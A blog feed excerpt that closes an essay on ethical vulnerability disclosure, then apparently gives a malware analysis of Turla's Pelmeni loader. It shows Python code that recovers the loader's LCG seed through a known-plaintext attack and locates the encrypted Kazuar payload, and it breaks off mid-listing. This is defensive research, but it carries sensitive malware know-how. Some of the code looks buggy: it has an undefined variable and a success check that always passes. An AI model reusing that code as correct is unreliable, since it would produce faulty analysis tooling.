<p>The Dutch model shows how this balance can emerge. The hacking community, academic researchers, and public agencies have built a cooperative disclosure culture that functions largely on mutual trust. It works because institutions are willing to interpret good-faith intrusion as a civic contribution rather than an offence. Yet this success also hides a vulnerability of its own. In 2020, the Dutch Public Prosecution Office published a <a href="https://www.om.nl/documenten/richtlijnen/2020/december/14/om-beleidsbrief-ethisch-hacken">non-prosecution policy</a> that defines proportionality and subsidiarity as requirements for ethical intrusion. Both depend on prior moral orientation, yet the model assumes that those who act in the public interest already know where the boundaries lie. In practice, that orientation is rarely taught, resulting in well-intending researchers making mistakes with legal liability as a consequence, or even the erosion of general willingness to notify.</p>

<p>We cannot expect everyone to possess the same virtues or to navigate the same moral thresholds intuitively. Ethical restraint, transparency, and proportionality are learned dispositions rather than natural instincts. Cultivating virtue requires more than ethical instruction. It requires opportunities to exercise moral judgment within safe and guided contexts. Encouraging people to take initiative in vulnerability disclosure without first teaching them how to handle ethical and legal risks breeds confusion, and sometimes harm. The capacity for moral judgment does not appear automatically with technical skill.</p>

<p>If the Netherlands wants to maintain its reputation for responsible disclosure, it must invest not only in frameworks and contact points but in education and mentorship as well. The same institutions that rely on civic virtue must also help cultivate it. Law can protect those acting in good faith, but it should also help form that good faith through guidance and training.</p>

<p>Across Europe, frameworks now define how vulnerabilities should be received, but not how they should be found or reported. Without guidance for the notifying side, accountability becomes uneven and moral initiative discouraged. A sustainable disclosure culture cannot depend solely on trust in moral instinct. It must also provide pathways to learn how to act responsibly before acting at all.</p>

<h1 id="virtue-before-permission">Virtue Before Permission</h1>

<p>Vulnerability disclosure began as a moral exception: an act taken without invitation, justified by necessity. Over time it evolved into a structured practice, but the underlying tension remains the same. Acting in the public interest often means acting before one is formally allowed to. The legitimacy of such acts does not come from the absence of rules but from the presence of trust in those who cross boundaries carefully.</p>

<p>That trust is fragile. It depends on the visible presence of character, on the quiet confidence that those who discover a vulnerability will handle it with restraint, honesty, and care. Policy can protect this space, but it cannot fill it. Virtue does not justify disregard for law, but it helps interpret whether a boundary was crossed in service of the public or against it. Without virtue, permission becomes meaningless.</p>

<p>If disclosure is to remain a civic act rather than a criminal risk, it will require more than frameworks and points of contact. It requires societies that can recognise ethical intent, and researchers who can demonstrate it. This is what <em>virtue before permission</em> means: not that ethics should replace law, but that the law should trust ethics enough to leave room for judgment and intervene only when that judgment clearly strays from the public interest.</p>

<p>Truly ethical vulnerability disclosure begins long before a report is sent or a patch is deployed. It begins in the cultivation of moral skill. That ability, once widespread, becomes its own kind of security: a shared understanding that acting with care is not a privilege but a responsibility. Before permission, there must be virtue—and before virtue, the willingness to act responsibly.</p>]]></content><author><name>Max van der Horst</name><email>mhvanderhorst@tudelft.nl</email></author><category term="Vulnerability Disclosure" /><category term="Cybersecurity Policy &amp; Ethics" /><summary type="html"><![CDATA[Responsible vulnerability disclosure begins with character. Without honesty, restraint, and care, rules become bureaucracy and outcomes become opportunism. Virtue is what turns unsolicited hacking into civic service.]]></summary></entry><entry><title type="html">Turla’s Pelmeni Wrapper: How Weak Crypto Exposed Kazuar’s Payload</title><link href="http://localhost:4000/2025/06/23/turla-pelmeni-wrapper-weak-crypto-kazuar-payload.html" rel="alternate" type="text/html" title="Turla’s Pelmeni Wrapper: How Weak Crypto Exposed Kazuar’s Payload" /><published>2025-06-23T00:00:00+02:00</published><updated>2025-06-23T00:00:00+02:00</updated><id>http://localhost:4000/2025/06/23/turla-pelmeni-wrapper-weak-crypto-kazuar-payload</id><content type="html" xml:base="http://localhost:4000/2025/06/23/turla-pelmeni-wrapper-weak-crypto-kazuar-payload.html"><![CDATA[<blockquote>
  <p><strong>Summary:</strong><br />
This post analyzes a cryptographic flaw in Pelmeni, a custom loader used by the Turla APT group to deploy Kazuar. While the malware uses environmental keying based on the victim’s host name, it relies on a weak pseudorandom number generator (Ranqd1) and reuses it to decrypt both export names and the embedded payload. By exploiting this weakness, we can recover the decryption seed and extract Kazuar without access to the victim environment. The post provides a reproducible method to identify, decrypt, and track such samples in the wild.</p>
</blockquote>

<p>Last year, I came across a great <a href="https://lab52.io/blog/pelmeni-wrapper-new-wrapper-of-kazuar-turla-backdoor/">blog post</a> by Lab52 analyzing a new wrapper for the Kazuar malware: <em>Pelmeni</em>. Their breakdown showed how the wrapper encrypts the Kazuar payload and ties decryption to the victim’s computer name. This ensures the malware only runs in the intended environment. That design raised some interesting questions: Was Kazuar used post-compromise for persistence? What does the full infection chain look like?</p>

<p>This blog does not aim to answer those broader questions. Instead, it focuses on a specific and previously undocumented weakness in Pelmeni’s cryptographic design. Lab52 noted that <em>the algorithm used to decrypt the payload and the one used to decrypt the export names is the same, which makes it vulnerable to brute-force attacks,</em> but they did not explain how exactly. Based on their findings, and on additional details from <a href="https://unit42.paloaltonetworks.com/pensive-ursa-uses-upgraded-kazuar-backdoor/">Unit 42’s analysis</a>, this post explains how that vulnerability works and why the cryptographic primitive used in Pelmeni can be exploited.</p>

<h1 id="what-is-pelmeni">What is Pelmeni?</h1>
<p>Pelmeni (Russian: <em>пельмени</em>, English: dumpling) is the name given by Lab52 to a wrapper used to drop recent variants of the Kazuar (<em>казуар</em>, cassowary) backdoor, which has been linked to Turla (also known as Secret Blizzard, Snake, Uroburos, or Venomous Bear), a threat actor that is allegedly linked to the Russian Federal Security Service (FSB). Rather than deploying Kazuar directly, Pelmeni is used as an intermediary wrapper to embed Kazuar as an encrypted payload. Upon execution, Pelmeni decrypts the payload and transfers execution to the decrypted binary. Moreover, even though Pelmeni is the dropper, it is itself a Dynamic Link Library (DLL) that is executed through the use of DLL Sideloading vulnerabilities in legitimate software from organizations like Nvidia, Brother, Intel, and others.</p>

<p>What makes Pelmeni noteworthy is its use of environmental keying. The decryption key for Kazuar is derived from the victim’s host name. This means that the payload will only decrypt correctly when run on the specific machine it was intended for. This kind of environment binding can serve both as an evasion technique and an operational safeguard.</p>

<p>This approach reflects Turla’s broader pattern: they often rely on tailored malware loaders, multi-stage payload delivery, and environmental checks to ensure stealth and resilience. Their operations typically prioritize long-term access and espionage, with custom tooling that is designed to persist in specific, high-value environments.</p>

<p>In addition to the encrypted payload, Pelmeni contains (randomly generated) export names that it decrypts during execution. These are typically function names that might be used to identify or interact with the payload. According to Lab52, the same algorithm is used to decrypt both the export names and the payload. This shared mechanism turns out to be the weak point in the entire design.</p>

<h1 id="pelmenis-cryptographic-primitives">Pelmeni’s cryptographic primitives</h1>
<p>As mentioned before, an interesting aspect of the Pelmeni wrapper (sha256:55580aedc4429496ef13080545f2ec6014e4e0f0774918dfa7fd12f048f2bdd2 in this post, but generally applicable) is the fact that its export names are decrypted during execution. The Lab52 blogpost describes that the second entrypoint of the DLL is responsible for executing one of the exported DLL functions. The decryption key to decrypt the export name is generated by providing the (hashed) hostname as a seed for a pseudorandom number generator (PRNG) called Ranqd1, which is a <a href="https://en.wikipedia.org/wiki/Linear_congruential_generator">Linear Congruential Generator (LCG)</a>. This PRNG was recognized by the constants that are, among the rest of the operation, shown in Figure 1 and generates a keystream per four bytes (hence the modulo 32).</p>

<p><img src="../../../assets/entrypoint_2_pelmeni.png" alt="" class="centered-img" />
<span class="centered-text">Figure 1: Second entrypoint of Pelmeni showing generation of decryption key</span></p>

<p>The algorithm that was used to turn the computername into a reliable seed is called <a href="https://www.drdobbs.com/database/algorithm-alley/184410284">Jenkins’ one at a time</a>, which is part of a non-cryptographic hash function family designed by Bob Jenkins. While known to contain some weak mixing behavior using the avalanche effect over 3-byte keys and commonly having collisions due to the small hash size (8 bytes), it is considered to have preimage resistance at the moment of writing. Unfortunately, this means that brute forcing for the victim’s hostname for victimology purposes may be infeasible. An implementation of Jenkins’ one at a time is shown in Listing 1.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">uint32_t</span> <span class="nf">jenkins_one_at_a_time_hash</span><span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="kt">uint32_t</span> <span class="n">hash</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">!=</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">hash</span> <span class="o">+=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">];</span>
    <span class="n">hash</span> <span class="o">+=</span> <span class="n">hash</span> <span class="o">&lt;&lt;</span> <span class="mi">10</span><span class="p">;</span>
    <span class="n">hash</span> <span class="o">^=</span> <span class="n">hash</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">hash</span> <span class="o">+=</span> <span class="n">hash</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">;</span>
  <span class="n">hash</span> <span class="o">^=</span> <span class="n">hash</span> <span class="o">&gt;&gt;</span> <span class="mi">11</span><span class="p">;</span>
  <span class="n">hash</span> <span class="o">+=</span> <span class="n">hash</span> <span class="o">&lt;&lt;</span> <span class="mi">15</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">hash</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 1: Jenkins’ one at a time implementation in C</span></p>

<p>In summary: the victim host name is hashed using Jenkins’ one at a time, that hash is XOR’ed with a hardcoded constant (<code class="language-plaintext highlighter-rouge">0x38a55104</code> in this case) and fed into the Ranqd1 PRNG algorithm. The outcome is the key that is used to decrypt the export names during execution. The process is also shown in Figure 2.</p>

<p>At the same time, as also shown in the Lab52 blogpost, the exact same constants and algorithm return right before dropping Kazuar, when Pelmeni has loaded the thread that is supposed to decrypt the payload. This gives away that the decryption routine for the export names and Kazuar itself are the same.</p>

<p><img src="../../../assets/encryption_scheme_pelmeni.png" alt="" class="centered-img" />
<span class="centered-text">Figure 2: Pelmeni encryption routine</span></p>

<h1 id="weakness-in-key-derivation">Weakness in key derivation</h1>
<p>As mentioned, the core cryptographic weakness in Pelmeni stems from the reuse of its decryption logic across both the Kazuar payload and the export function names. This shared mechanism enables recovering the seed that can be used to decrypt Kazuar. Specifically the use of the LCG, which is a relatively weak PRNG algorithm, allows for recovering a keystream that can decrypt both the export names and the payload.</p>

<p>Looking at the PRNG in more detail, it is defined as follows:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Provided parameter is the seed</span>
<span class="kt">uint32_t</span> <span class="nf">rand_nsmb</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="n">state</span><span class="p">){</span>
    <span class="kt">uint64_t</span> <span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)(</span><span class="o">*</span><span class="n">state</span><span class="p">)</span> <span class="o">*</span> <span class="mi">1664525</span> <span class="o">+</span> <span class="mi">1013904223</span><span class="p">;</span>
    <span class="k">return</span> <span class="o">*</span><span class="n">state</span> <span class="o">=</span> <span class="n">value</span> <span class="o">+</span> <span class="p">(</span><span class="n">value</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 2: ranqd1 implementation in C</span></p>

<p>While the XOR operations and processing seem to provide some obfuscation at first, its entire security hinges on the secrecy of the seed. Due to the fact that we know that the routine is based on XOR operations and we have access to both the ciphertext and plaintext of the export function names, we can launch a known plaintext attack to obtain the original seed.</p>

<p>This can be done by taking the first four bytes of the ciphertext and plaintext and XOR’ing those to get the keystream used for the export function name. Then, to obtain the seed, we can reverse the LCG with the known constants.</p>

<p>The process is shown in Figure 3. Where the original keystream is calculated by solving for \(keystream = (seed * a + c) \mod 2^{32}\), the seed can be calculated in a similar fashion by solving for \(seed = (keystream - c) * a^{-1} \mod 2^{32}\). The important detail here is the use of the first constant: \(a\). To reverse the LCG, we have to calculate the multiplicative inverse of this value, which is 1664525, alongside the modulus, which is 32. This leaves us with the number 5, which allows us to start testing the decryption of export function names.</p>

<p><img src="../../../assets/seed_recovery_pelmeni.png" alt="" class="centered-img" />
<span class="centered-text">Figure 3: Recovering the original seed</span></p>

<h1 id="brute-forcing-the-seed-in-practice">Brute-forcing the seed in practice</h1>
<p>To reproduce this decryption process without knowing the victim’s host name, we can now calculate the original seed produced by Jenkins’ one at a time that was XOR’ed with the earlier found constant. But first, we need to extract the right data from the binary itself. We know that, on multiple locations in the binary, Pelmeni decrypts export function names. This behavior can be identified in the binary in multiple places, but always with the pattern shown in Listing 3.</p>

<pre><code class="language-asm">703c15c0  c744240406000000   mov     dword [esp+0x4], 0x6       \\ Pushes string size onto stack at [esp+0x4]
703c15c8  c7042498413e70     mov     dword [esp], 0x703e4198    \\ Pushes RVA of string to [esp]
</code></pre>
<p><span class="centered-text">Listing 3: Instructions prior to decrypting export function name</span></p>

<p>The string size varies, as the export names are randomly generated per sample. Therefore, if we want to find the original seed of any sample, we will have to write a regular expression for both the Relative Virtual Address (RVA) and actual string size (6 bytes in the case shown in Listing 3). We can do this as follows.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">re</span><span class="p">,</span> <span class="n">struct</span><span class="p">,</span> <span class="n">pefile</span>
<span class="n">binary_loc</span> <span class="o">=</span> <span class="sh">"</span><span class="s">./55580aedc4429496ef13080545f2ec6014e4e0f0774918dfa7fd12f048f2bdd2</span><span class="sh">"</span>
<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">binary_loc</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
    <span class="nb">bin</span> <span class="o">=</span> <span class="nb">file</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>

<span class="n">regex</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">compile</span><span class="p">(</span>
    <span class="sa">rb</span><span class="sh">"</span><span class="s">\x85\xC0\xC7\x44\x24\x04(?P&lt;exportname_size&gt;....)</span><span class="sh">"</span> 
    <span class="sa">rb</span><span class="sh">"</span><span class="s">\xC7\x04\x24(?P&lt;exportname_rva&gt;.{4})</span><span class="sh">"</span><span class="p">,</span>
    <span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span>
<span class="p">)</span>
<span class="n">export_name_encrypted</span> <span class="o">=</span> <span class="n">regex</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="nb">bin</span><span class="p">)</span>
<span class="n">export_name_size</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;I</span><span class="sh">"</span><span class="p">,</span> <span class="n">export_name_encrypted</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="sh">"</span><span class="s">exportname_size</span><span class="sh">"</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">export_name_rva</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;I</span><span class="sh">"</span><span class="p">,</span> <span class="n">export_name_encrypted</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="sh">"</span><span class="s">exportname_rva</span><span class="sh">"</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">pe</span> <span class="o">=</span> <span class="n">pefile</span><span class="p">.</span><span class="nc">PE</span><span class="p">(</span><span class="n">binary_loc</span><span class="p">)</span>
<span class="n">export_name_rva</span> <span class="o">=</span> <span class="n">export_name_rva</span> <span class="o">-</span> <span class="n">pe</span><span class="p">.</span><span class="n">OPTIONAL_HEADER</span><span class="p">.</span><span class="n">ImageBase</span>
<span class="n">file_offset</span> <span class="o">=</span> <span class="n">pe</span><span class="p">.</span><span class="nf">get_offset_from_rva</span><span class="p">(</span><span class="n">export_name_rva</span><span class="p">)</span>

<span class="n">final_encrypted_string</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">[</span><span class="n">file_offset</span><span class="p">:</span><span class="n">file_offset</span><span class="o">+</span><span class="n">export_name_size</span><span class="p">]</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 4: Retrieving encrypted export names</span></p>

<p>Now that we have one of the encrypted export names, we want to extract all the export names from the binary. With the ciphertext and plaintext versions of the export name, we can construct our known plaintext attack to retrieve the seed. We can obtain seed candidates by reversing the LCG with the earlier described method and attempting to decrypt the ciphertext with the seed candidate. The ranqd1 constants seem to be consistent across samples, so for now we can keep these hardcoded. When the decryption routine with a seed candidate results in a known export name, we know we have the correct and original seed.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">reverse_lcg</span><span class="p">(</span><span class="n">candidate</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
    <span class="n">a</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">modulus</span> <span class="o">=</span> <span class="mh">0x19660D</span><span class="p">,</span> <span class="mh">0x3C6EF35F</span><span class="p">,</span> <span class="mi">2</span><span class="o">**</span><span class="mi">32</span>
    <span class="n">a_mult_inv</span> <span class="o">=</span> <span class="nf">pow</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">modulo</span><span class="p">)</span>                      <span class="c1"># Compute multiplicative inverse
</span>    <span class="nf">return </span><span class="p">(</span><span class="n">a_mult_inv</span> <span class="o">*</span> <span class="p">(</span><span class="n">candidate</span> <span class="o">-</span> <span class="n">c</span><span class="p">))</span> <span class="o">%</span> <span class="n">modulus</span> <span class="c1"># Reverse LCG formula
</span>
<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">candidate</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
    <span class="n">a</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">modulus</span> <span class="o">=</span> <span class="mh">0x19660D</span><span class="p">,</span> <span class="mh">0x3C6EF35F</span><span class="p">,</span> <span class="mi">2</span><span class="o">**</span><span class="mi">32</span>
    <span class="n">decrypted</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)):</span>                <span class="c1"># Reconstruct LCG routine
</span>        <span class="k">if</span> <span class="n">i</span> <span class="o">&amp;</span> <span class="mi">3</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">candidate</span> <span class="o">=</span> <span class="p">(</span><span class="n">candidate</span> <span class="o">*</span> <span class="n">a</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span> <span class="o">%</span> <span class="n">modulus</span>
        <span class="n">lcg_bytes</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;I</span><span class="sh">"</span><span class="p">,</span> <span class="n">candidate</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
        <span class="n">decrypted</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">lcg_bytes</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">4</span><span class="p">])</span>
    <span class="k">return</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span>

<span class="c1"># Extract plaintext export names
</span><span class="n">pe_bin</span> <span class="o">=</span> <span class="n">pefile</span><span class="p">.</span><span class="nc">PE</span><span class="p">(</span><span class="n">binary_loc</span><span class="p">)</span>
<span class="n">pe_bin</span><span class="p">.</span><span class="nf">parse_data_directories</span><span class="p">(</span><span class="n">directories</span><span class="o">=</span><span class="p">[</span><span class="n">pefile</span><span class="p">.</span><span class="n">DIRECTORY_ENTRY</span><span class="p">[</span><span class="sh">"</span><span class="s">IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class="sh">"</span><span class="p">]])</span>
<span class="n">export_names</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">symbol</span> <span class="ow">in</span> <span class="n">pe</span><span class="p">.</span><span class="n">DIRECTORY_ENTRY_EXPORT</span><span class="p">.</span><span class="n">symbols</span><span class="p">:</span>
    <span class="n">identifier</span> <span class="o">=</span> <span class="n">symbol</span><span class="p">.</span><span class="n">ordinal</span>
    <span class="n">name</span> <span class="o">=</span> <span class="n">symbol</span><span class="p">.</span><span class="n">name</span>
    <span class="n">export_names</span><span class="p">.</span><span class="nf">append</span><span class="p">((</span><span class="n">identifier</span><span class="p">,</span> <span class="n">name</span><span class="p">))</span>

<span class="c1"># Start operating on earlier found ciphertext in order to rebuild key candidate
</span><span class="k">for</span> <span class="n">identifier</span><span class="p">,</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">export_names</span><span class="p">:</span>
    <span class="n">name</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span>                                  <span class="c1"># Decrypted string ends with \x00
</span>    <span class="n">key_attempt</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">()</span>
    <span class="n">ciphertext_bytes</span> <span class="o">=</span> <span class="n">final_encrypted_string</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span>
    <span class="n">plaintext_bytes</span> <span class="o">=</span> <span class="n">name</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">index</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">key_attempt</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">ciphertext_bytes</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">^</span> <span class="n">plaintext_bytes</span><span class="p">[</span><span class="n">index</span><span class="p">])</span>
    
    <span class="c1"># Reverse LCG on key candidate
</span>    <span class="n">key_attempt</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;I</span><span class="sh">"</span><span class="p">,</span> <span class="n">key_attempt</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">candidate</span> <span class="o">=</span> <span class="nf">reverse_lcg</span><span class="p">(</span><span class="n">key_attempt</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Attempting decryption with </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">candidate</span><span class="p">)</span><span class="si">}</span><span class="s"> against export name </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">if</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">final_encrypted_string</span><span class="p">,</span> <span class="n">candidate</span><span class="p">):</span>   <span class="c1"># Seed found
</span>        <span class="n">seed</span> <span class="o">=</span> <span class="nf">hex</span><span class="p">(</span><span class="n">candidate</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[!] Seed </span><span class="si">{</span><span class="n">candidate</span><span class="si">}</span><span class="s"> found to be correct.</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">break</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 5: Executing a known plaintext attack on the seed</span></p>

<p>The terminal output in Listing 6 shows the correct seed for our sample, which was identified as <code class="language-plaintext highlighter-rouge">0xa7655e3f</code> matching on the export name <code class="language-plaintext highlighter-rouge">Shgyo</code>. This is also in line with the length of the encrypted export name that we found using the regular expression, as it is 6 bytes long when a nullbyte is appended. With this information, it is time to start seeking out the encrypted Kazuar sample for decryption.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 decrypt.py
Attempting decryption with 0x44594765 against export name b'Aoimzajs@0\x00'
Attempting decryption with 0x91fde603 against export name b'Gmlkwiqm@4\x00'
Attempting decryption with 0x4261dddc against export name b'Jagiwl@4\x00'
Attempting decryption with 0xc671d3a1 against export name b'Mfnxhg\x00'
Attempting decryption with 0x29e60da1 against export name b'Mtkvsmmq@4\x00'
Attempting decryption with 0x8dc2197a against export name b'Pduouohn@0\x00'
Attempting decryption with 0x4cb5a27a against export name b'Pqasrqht@4\x00'
Attempting decryption with 0x332671b5 against export name b'Qirlbb\x00'
Attempting decryption with 0xa7655e3f against export name b'Shgyo\x00'
[!] Seed 0xa7655e3f found to be correct.
</code></pre></div></div>
<p><span class="centered-text">Listing 6: Terminal output of the script</span></p>

<h1 id="decrypting-kazuar">Decrypting Kazuar</h1>
<p>The Lab52 blog post already mentioned some hints on where to find the encrypted payload. We have earlier confirmed that the decryption algorithm for the export names and Kazuar itself is the exact same. Hence, we can search for occurrence of the ranqd1 constants throughout the binary. Moreover, the blog post describes the preparation of a thread that decrypts Kazuar and shows a screenshot of what this code looks like. After searching the binary for the ranqd1 constants, the content of Figure 4 showed up. This assembly (and the belonging pseudocode, looking like Figure 1) gives three hints:</p>
<ul>
  <li>The address of the buffer containing Kazuar is <code class="language-plaintext highlighter-rouge">0x703e44e0</code></li>
  <li>The LCG routine starts on <code class="language-plaintext highlighter-rouge">0x703e0d45</code> and performs the XOR operation with the LCG byte on <code class="language-plaintext highlighter-rouge">0x703e0d85</code></li>
  <li>The size of the Kazuar buffer is included on <code class="language-plaintext highlighter-rouge">0x703e0d95</code>, showing that the payload has an allocated size of <code class="language-plaintext highlighter-rouge">0x2411ff</code> (~2.3mb)</li>
</ul>

<p>This allows us to write a second regular expression that will allow us to extract and decrypt the Kazuar payload.</p>

<p><img src="../../../assets/locating_kazuar.png" alt="" class="centered-img" />
<span class="centered-text">Figure 4: Locating the Kazuar payload</span></p>

<p>To make the decryption routine work independently of the sample being analyzed, we need two key details from the binary: the location of the payload and its size. We’ve already identified these values, now we need to extract them. Examining the surrounding opcodes preceding the payload location, there is a consistent instruction sequence:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">mov</code> (<code class="language-plaintext highlighter-rouge">0x8B</code>),</li>
  <li><code class="language-plaintext highlighter-rouge">add</code> (<code class="language-plaintext highlighter-rouge">0x05</code>), and</li>
  <li><code class="language-plaintext highlighter-rouge">movzx</code> (<code class="language-plaintext highlighter-rouge">0x0F</code>).</li>
</ul>

<p>Similarly, the size value is loaded in a loop whose upper bound is defined by:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">cmp [ebp-0xC]</code> (<code class="language-plaintext highlighter-rouge">0x817DF4</code>)</li>
  <li>followed by a conditional jump <code class="language-plaintext highlighter-rouge">jbe</code> (<code class="language-plaintext highlighter-rouge">0x76</code>),</li>
  <li>and later on, a <code class="language-plaintext highlighter-rouge">call</code> instruction (<code class="language-plaintext highlighter-rouge">0xE8</code>).</li>
</ul>

<p>Between the <code class="language-plaintext highlighter-rouge">jbe</code> and <code class="language-plaintext highlighter-rouge">call</code> instructions, there is one variable byte that is skipped over. We do need the <code class="language-plaintext highlighter-rouge">call</code> instruction as this makes the sequence specific enough to use. This will lead to the following regular expression and extraction method.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload_location</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x8B\x45\xF4\x05</span><span class="s">(?P&lt;payload&gt;....)</span><span class="se">\x0F</span><span class="sh">"</span>
<span class="n">payload_size</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x81\x7D\xF4</span><span class="s">(?P&lt;payload_size&gt;....)</span><span class="se">\x76</span><span class="s">.</span><span class="se">\xE8</span><span class="sh">"</span>
<span class="n">match_location</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="n">payload_location</span><span class="p">,</span> <span class="nb">bin</span><span class="p">)</span>
<span class="n">match_size</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="n">payload_size</span><span class="p">,</span> <span class="nb">bin</span><span class="p">)</span>

<span class="n">kazuar_address</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;I</span><span class="sh">"</span><span class="p">,</span> <span class="n">match_location</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="sh">"</span><span class="s">payload</span><span class="sh">"</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">kazuar_size</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;I</span><span class="sh">"</span><span class="p">,</span> <span class="n">match_size</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="sh">"</span><span class="s">payload_size</span><span class="sh">"</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">kazuar_rva</span> <span class="o">=</span> <span class="n">kazuar_address</span> <span class="o">-</span> <span class="n">pe</span><span class="p">.</span><span class="n">OPTIONAL_HEADER</span><span class="p">.</span><span class="n">ImageBase</span>
